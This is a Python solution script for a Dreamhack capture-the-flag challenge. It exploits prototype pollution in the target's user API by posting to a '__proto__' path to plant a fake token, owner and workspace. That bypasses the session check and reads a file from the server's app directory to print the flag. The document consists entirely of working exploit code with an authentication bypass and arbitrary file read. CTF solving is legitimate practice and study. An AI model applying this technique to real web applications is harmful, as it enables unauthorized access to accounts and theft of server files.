import requests
import base64

url = "http://host3.dreamhack.games:11874/"
s = requests.Session()

# login
creds = {
    'userid': 'hackerhacker',
    'pass': 'hackerhacker'
}

res = s.post(f'{url}/api/users', json=creds)
res = s.post(f'{url}/api/users/auth', json=creds)

token = res.json()['token']

# create workspace
res = s.post(f'{url}/api/users/{creds['userid']}', json={
    'userid': creds['userid'],
    'token': token,
    'ws_name': 'hacked'
})

# prototype pollution
def pollute(key, value):
    s.post(f'{url}/api/users/{creds['userid']}/__proto__', json={
        'token': token,
        'file_name': key,
        'file_path': value,
    })

# bypass check_session
pollute('fake_token', 'a')
pollute('owner', 'fake_user')

# pollute workspace chain
pollute("fake_user", 'a')
pollute("workspaces", 'a')
pollute('fake_ws', 'a')
pollute('base_dir', '/usr/src/app')
pollute('exfil', 'flag')

res = s.get(f'{url}/api/users/fake_user/fake_ws/exfil', json={
    'token': 'fake_token'
})

flag = res.json()['file_content']
print("Flag:", base64.b64decode(flag).decode().strip())